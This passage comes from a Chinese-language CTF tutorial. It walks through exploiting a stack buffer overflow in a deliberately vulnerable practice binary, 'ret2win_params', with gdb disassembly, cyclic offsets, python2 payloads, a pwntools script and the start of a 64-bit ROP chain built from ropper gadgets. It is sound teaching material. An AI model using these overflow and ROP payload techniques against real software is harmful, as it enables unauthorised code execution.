&lt;+43&gt;:	lea    eax,[ebx-0x1f65]</span><br><span class="line">   0x08049206 &lt;+49&gt;:	push   eax</span><br><span class="line">   0x08049207 &lt;+50&gt;:	call   0x8049060 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804920c &lt;+55&gt;:	add    esp,0x10</span><br><span class="line">   0x0804920f &lt;+58&gt;:	sub    esp,0x8</span><br><span class="line">   0x08049212 &lt;+61&gt;:	lea    eax,[ebp-0x18]</span><br><span class="line">   0x08049215 &lt;+64&gt;:	push   eax</span><br><span class="line">   0x08049216 &lt;+65&gt;:	lea    eax,[ebx-0x1f62]</span><br><span class="line">   0x0804921c &lt;+71&gt;:	push   eax</span><br><span class="line">   0x0804921d &lt;+72&gt;:	call   0x8049030 &lt;printf@plt&gt;</span><br><span class="line">   0x08049222 &lt;+77&gt;:	add    esp,0x10</span><br><span class="line">   0x08049225 &lt;+80&gt;:	nop</span><br><span class="line">   0x08049226 &lt;+81&gt;:	mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08049229 &lt;+84&gt;:	leave</span><br><span class="line">   0x0804922a &lt;+85&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">gef➤  b *0x0804922a</span><br><span class="line">Breakpoint 1 at 0x804922a</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run &lt; exp</span><br><span class="line"></span><br><span class="line">●→  0x804922a &lt;register_name+0055&gt; ret    </span><br><span class="line">   ↳   0x8049182 &lt;hacked+0000&gt;    push   ebp</span><br><span class="line">       0x8049183 &lt;hacked+0001&gt;    mov    ebp, esp</span><br><span class="line">       0x8049185 &lt;hacked+0003&gt;    push   ebx</span><br><span class="line">       0x8049186 &lt;hacked+0004&gt;    sub    esp, 0x4</span><br><span class="line">       0x8049189 &lt;hacked+0007&gt;    call   0x8049247 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">       0x804918e &lt;hacked+000c&gt;    add    eax, 0x2e72</span><br></pre></td></tr></table></figure></div><ul><li>成功覆盖了原本的返回地址</li><li>一直按<code>n</code>到<code>cmp</code>这一行</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→  0x8049193 &lt;hacked+0011&gt;    cmp    DWORD PTR [ebp+0x8], 0xdeadbeef</span><br></pre></td></tr></table></figure></div><ul><li>查看这个寄存器里的值</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp + 8</span><br><span class="line">0xffffcad4:	0x42424242</span><br></pre></td></tr></table></figure></div><blockquote><p>0x42转换成ascii码是大写的B，对比失败后程序会跳转，破解失败</p></blockquote><ul><li>修改exp内容</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print &#x27;A&#x27;*28+&#x27;\x82\x91\x04\x08&#x27;+&#x27;AAAA&#x27;+&#x27;\xef\xbe\xad\xde&#x27;+&#x27;CCCC&#x27;+&#x27;DDDD&#x27;&quot; &gt; exp</span><br></pre></td></tr></table></figure></div><ul><li>再次打断点+运行</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp+0x8</span><br><span class="line">0xffffcad4:	0xdeadbeef</span><br></pre></td></tr></table></figure></div><blockquote><p>第一个寄存器的值对了</p></blockquote><ul><li>查看下一个寄存器的值</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp+0xc</span><br><span class="line">0xffffcad8:	0x43434343</span><br></pre></td></tr></table></figure></div><blockquote><p>0x43转换成ascii码是大写的C，于是再改一下脚本</p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print &#x27;A&#x27;*28+&#x27;\x82\x91\x04\x08&#x27;+&#x27;AAAA&#x27;+&#x27;\xef\xbe\xad\xde&#x27;+&#x27;\xbe\xba\xde\xc0&#x27;+&#x27;DDDD&#x27;&quot; &gt; exp</span><br></pre></td></tr></table></figure></div><ul><li>再次查看寄存器的值</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp+0x8</span><br><span class="line">0xffffcad4:	0xdeadbeef</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">gef➤  x $ebp+0xc</span><br><span class="line">0xffffcad8:	0xc0debabe</span><br></pre></td></tr></table></figure></div><blockquote><p>成功破解程序</p><p>也可以直接运行程序然后导入文件进行破解</p></blockquote><h4 id="pwntools脚本-v3"><a class="header-anchor" href="#pwntools脚本-v3">¶</a>pwntools脚本</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   //导入pwntools模块</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win_params&#x27;</span>)    //运行程序</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">28</span> + p32(<span class="number">0x08049182</span>) + <span class="string">b&#x27;AAAA&#x27;</span> +p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xc0debabe</span>))   //程序运行后发送指定的字符串，格式为<span class="number">32</span>位</span><br><span class="line"><span class="built_in">print</span>(io.recvall())   //接收输出</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./ret2win_params&#x27;: pid 4700</span><br><span class="line">[+] Receiving all data: Done (119B)</span><br><span class="line">[*] Process &#x27;./ret2win_params&#x27; stopped with exit code -11 (SIGSEGV) (pid 4700)</span><br><span class="line">b&#x27;Name:\nHi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x82\x91\x04\x08AAAA\xef\xbe\xad\xde\xbe\xba\xde\xc0\nThis function is TOP SECRET! How did you get in here?! :O\n&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="64位"><a class="header-anchor" href="#64位">¶</a>64位</h3><h4 id="获取文件信息"><a class="header-anchor" href="#获取文件信息">¶</a>获取文件信息</h4><ul><li>使用<code>checksec</code>查看程序详细信息</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  64-bit git:(master) ✗ checksec ret2win_params</span><br><span class="line">[*] &#x27;/home/xaut/Desktop/baimaoTutorial/crypto-cat-ctf/pwn/binary_exploitation_101/04-ret2win_with_params/64-bit/ret2win_params&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><ul><li>查看源代码</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  <span class="number">64</span>-bit git:(master) ✗ cat ret2win_params.c </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">(<span class="type">long</span> first, <span class="type">long</span> second)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="number">0xdeadbeefdeadbeef</span> &amp;&amp; second == <span class="number">0xc0debabec0debabe</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This function is TOP SECRET! How did you get in here?! :O\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unauthorised access to secret function detected, authorities have been alerted!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi there, %s\n&quot;</span>, buffer);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    register_name();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="动态调试-v5"><a class="header-anchor" href="#动态调试-v5">¶</a>动态调试</h4><ul><li>gdb</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2win_params</span><br></pre></td></tr></table></figure></div><ul><li>查看函数和反汇编<code>hacked</code>函数</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000000401000  _init</span><br><span class="line">0x0000000000401030  puts@plt</span><br><span class="line">0x0000000000401040  printf@plt</span><br><span class="line">0x0000000000401050  __isoc99_scanf@plt</span><br><span class="line">0x0000000000401060  _start</span><br><span class="line">0x0000000000401090  _dl_relocate_static_pie</span><br><span class="line">0x00000000004010a0  deregister_tm_clones</span><br><span class="line">0x00000000004010d0  register_tm_clones</span><br><span class="line">0x0000000000401110  __do_global_dtors_aux</span><br><span class="line">0x0000000000401140  frame_dummy</span><br><span class="line">0x0000000000401142  hacked</span><br><span class="line">0x0000000000401190  register_name</span><br><span class="line">0x00000000004011d7  main</span><br><span class="line">0x00000000004011f0  __libc_csu_init</span><br><span class="line">0x0000000000401250  __libc_csu_fini</span><br><span class="line">0x0000000000401254  _fini</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gef➤  disassemble hacked </span><br><span class="line">Dump of assembler code for function hacked:</span><br><span class="line">   0x0000000000401142 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000401143 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000401146 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x000000000040114a &lt;+8&gt;:	mov    QWORD PTR [rbp-0x8],rdi</span><br><span class="line">   0x000000000040114e &lt;+12&gt;:	mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">   0x0000000000401152 &lt;+16&gt;:	movabs rax,0xdeadbeefdeadbeef</span><br><span class="line">   0x000000000040115c &lt;+26&gt;:	cmp    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401160 &lt;+30&gt;:	jne    0x401180 &lt;hacked+62&gt;</span><br><span class="line">   0x0000000000401162 &lt;+32&gt;:	movabs rax,0xc0debabec0debabe</span><br><span class="line">   0x000000000040116c &lt;+42&gt;:	cmp    QWORD PTR [rbp-0x10],rax</span><br><span class="line">   0x0000000000401170 &lt;+46&gt;:	jne    0x401180 &lt;hacked+62&gt;</span><br><span class="line">   0x0000000000401172 &lt;+48&gt;:	lea    rdi,[rip+0xe8f]        # 0x402008</span><br><span class="line">   0x0000000000401179 &lt;+55&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040117e &lt;+60&gt;:	jmp    0x40118d &lt;hacked+75&gt;</span><br><span class="line">   0x0000000000401180 &lt;+62&gt;:	lea    rdi,[rip+0xec1]        # 0x402048</span><br><span class="line">   0x0000000000401187 &lt;+69&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040118c &lt;+74&gt;:	nop</span><br><span class="line">   0x000000000040118d &lt;+75&gt;:	nop</span><br><span class="line">   0x000000000040118e &lt;+76&gt;:	leave</span><br><span class="line">   0x000000000040118f &lt;+77&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></div><blockquote><p>跟32位不太一样</p></blockquote><ul><li>输入命令<code>cyclic</code>就能获得测试用的字符串</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ cyclic 100</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br></pre></td></tr></table></figure></div><blockquote><p>作用：生成100个字符串，每四个字符的最后一个字符都不一样，用于测试覆盖程序的返回地址需要多少个字符</p></blockquote><ul><li>在<code>register_name</code>的<code>ret</code>指令前设置一个断点</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble register_name </span><br><span class="line">Dump of assembler code for function register_name:</span><br><span class="line">   0x0000000000401190 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000401191 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000401194 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x0000000000401198 &lt;+8&gt;:	lea    rdi,[rip+0xefa]        # 0x402099</span><br><span class="line">   0x000000000040119f &lt;+15&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004011a4 &lt;+20&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004011a8 &lt;+24&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004011ab &lt;+27&gt;:	lea    rdi,[rip+0xeed]        # 0x40209f</span><br><span class="line">   0x00000000004011b2 &lt;+34&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004011b7 &lt;+39&gt;:	call   0x401050 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x00000000004011bc &lt;+44&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004011c0 &lt;+48&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004011c3 &lt;+51&gt;:	lea    rdi,[rip+0xed8]        # 0x4020a2</span><br><span class="line">   0x00000000004011ca &lt;+58&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004011cf &lt;+63&gt;:	call   0x401040 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000004011d4 &lt;+68&gt;:	nop</span><br><span class="line">   0x00000000004011d5 &lt;+69&gt;:	leave</span><br><span class="line">   0x00000000004011d6 &lt;+70&gt;:	ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gef➤  b *0x4011d6</span><br><span class="line">Breakpoint 1 at 0x4011d6</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li>运行</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$rax   : 0x6f              </span><br><span class="line">$rbx   : 0x00007fffffffd9c8  →  0x00007fffffffdd90  →  &quot;/home/xaut/Desktop/baimaoTutorial/crypto-cat-ctf/p[...]&quot;</span><br><span class="line">$rcx   : 0x0               </span><br><span class="line">$rdx   : 0x0               </span><br><span class="line">$rsp   : 0x00007fffffffd898  →  &quot;gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]&quot;</span><br><span class="line">$rbp   : 0x6161616661616165 (&quot;eaaafaaa&quot;?)</span><br><span class="line">$rsi   : 0x00000000004052a0  →  &quot;Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa[...]&quot;</span><br><span class="line">$rdi   : 0x00007fffffffd6a0  →  0x00007fffffffd6d0  →  &quot;Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa[...]&quot;</span><br><span class="line">$rip   : 0x00000000004011d6  →  &lt;register_name+0046&gt; ret </span><br></pre></td></tr></table></figure></div><blockquote><p>e开头的寄存器都变成r开头的了，这也是64位程序的一个特征</p><p>32位只有4个字节，而64位有8个字节</p></blockquote><ul><li>检查栈顶内容</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/1gx $rsp</span><br><span class="line">0x7fffffffd898:	0x6161616861616167</span><br></pre></td></tr></table></figure></div><blockquote><p>x/1gx $rsp 命令表示从 rsp 指针所指向的地址开始，显示1个8字节（g 表示8字节）的内容<br>输出 0x7fffffffd898: 0x0000000000401200 表示栈顶的内容是 0x0000000000401200，这就是返回地址</p></blockquote><ul><li>复制返回的地址去解码</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ unhex 6161616861616167</span><br><span class="line">aaahaaag</span><br></pre></td></tr></table></figure></div><blockquote><p>注意:</p><p>由于在x86架构里，读取地址是由低到高的，所以这里的字符串是gaaahaaa</p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  cyclic -l gaaa</span><br><span class="line">24</span><br></pre></td></tr></table></figure></div><blockquote><p>说明要覆盖<code>rip</code>原本的返回地址并控制</p><p>就需要24个字符+想让程序跳转执行的地址</p></blockquote><ul><li>hacked函数的地址</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble hacked</span><br><span class="line">Dump of assembler code for function hacked:</span><br><span class="line">   0x0000000000401142 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000401143 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000401146 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x000000000040114a &lt;+8&gt;:	mov    QWORD PTR [rbp-0x8],rdi</span><br><span class="line">   0x000000000040114e &lt;+12&gt;:	mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">   0x0000000000401152 &lt;+16&gt;:	movabs rax,0xdeadbeefdeadbeef</span><br><span class="line">   0x000000000040115c &lt;+26&gt;:	cmp    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401160 &lt;+30&gt;:	jne    0x401180 &lt;hacked+62&gt;</span><br><span class="line">   0x0000000000401162 &lt;+32&gt;:	movabs rax,0xc0debabec0debabe</span><br><span class="line">   0x000000000040116c &lt;+42&gt;:	cmp    QWORD PTR [rbp-0x10],rax</span><br><span class="line">   0x0000000000401170 &lt;+46&gt;:	jne    0x401180 &lt;hacked+62&gt;</span><br><span class="line">   0x0000000000401172 &lt;+48&gt;:	lea    rdi,[rip+0xe8f]        # 0x402008</span><br><span class="line">   0x0000000000401179 &lt;+55&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040117e &lt;+60&gt;:	jmp    0x40118d &lt;hacked+75&gt;</span><br><span class="line">   0x0000000000401180 &lt;+62&gt;:	lea    rdi,[rip+0xec1]        # 0x402048</span><br><span class="line">   0x0000000000401187 &lt;+69&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040118c &lt;+74&gt;:	nop</span><br><span class="line">   0x000000000040118d &lt;+75&gt;:	nop</span><br><span class="line">   0x000000000040118e &lt;+76&gt;:	leave</span><br><span class="line">   0x000000000040118f &lt;+77&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401142</span><br></pre></td></tr></table></figure></div><blockquote><p>hacked函数的地址</p><p>然后程序缓冲区的区间是24个字符</p></blockquote><h5 id="关于64位寄存器的知识点"><a class="header-anchor" href="#关于64位寄存器的知识点">¶</a>关于64位寄存器的知识点</h5><ul><li>64位程序将要对比的值存入<code>rdi</code>和<code>rsi</code>寄存器里</li><li>在64位寄存器中有两个寄存器需要知道：<code>rdi</code>寄存器和<code>rsi</code>寄存器<ul><li><code>rdi</code>寄存器用于第一个参数传递</li><li><code>rsi</code>是第二个参数传递</li><li>把对比的值放入这两个寄存器里，就需要参数传递</li><li>64位比32位要麻烦许多</li></ul></li></ul><h5 id="构造ROP链"><a class="header-anchor" href="#构造ROP链">¶</a>构造ROP链</h5><ul><li>找到<code>rdi</code>寄存器和<code>rsi</code>寄存器等特殊的寄存器<ul><li>需要<code>ropper</code>这个工具</li><li>用处：<strong>寻找指定操作指令的地址</strong></li></ul></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install ropper   # 安装ropper  </span><br><span class="line">ropper --file ret2win_params --search &quot;pop rdi&quot;  # 从内存中弹出值到rdi寄存器中</span><br></pre></td></tr></table></figure></div><ul><li>找到<code>pop rdi</code>指令的地址</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  ropper --file ret2win_params --search &quot;pop rdi&quot;</span><br><span class="line"></span><br><span class="line">[INFO] Load gadgets for section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[INFO] Load gadgets for section: GNU_STACK</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching for gadgets: pop rdi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] File: ret2win_params</span><br><span class="line">0x000000000040124b: pop rdi; ret; </span><br></pre></td></tr></table></figure></div><ul><li>执行<code>pop rdi</code>操作的地址</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040124b</span><br></pre></td></tr></table></figure></div><ul><li>继续补全我们的脚本<code>0xdeadbeefdeadbeef</code></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &#x27;print &quot;A&quot; * 24 + &quot;\x4b\x12\x40\x00\x00\x00\x00\x00&quot; + &quot;\xef\xbe\xad\xde\xef\xbe\xad\xde&quot;&#x27;</span><br></pre></td></tr></table></figure></div><blockquote><p>从内存中弹出并存放到rdi寄存器里的值</p><p>就是需要对比的字符deadbeefdeadbeef</p></blockquote><ul><li>找到<code>pop rsi</code>指令的地址</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ret2win_params --search &quot;pop rsi&quot;  </span><br></pre></td></tr></table></figure></div><blockquote><p>从内存中弹出值到<code>rsi</code>寄存器中</p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ ropper --file ret2win_params --search &quot;pop rsi&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching for gadgets: pop rsi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] File: ret2win_params</span><br><span class="line">0x0000000000401249: pop rsi; pop r15; ret; 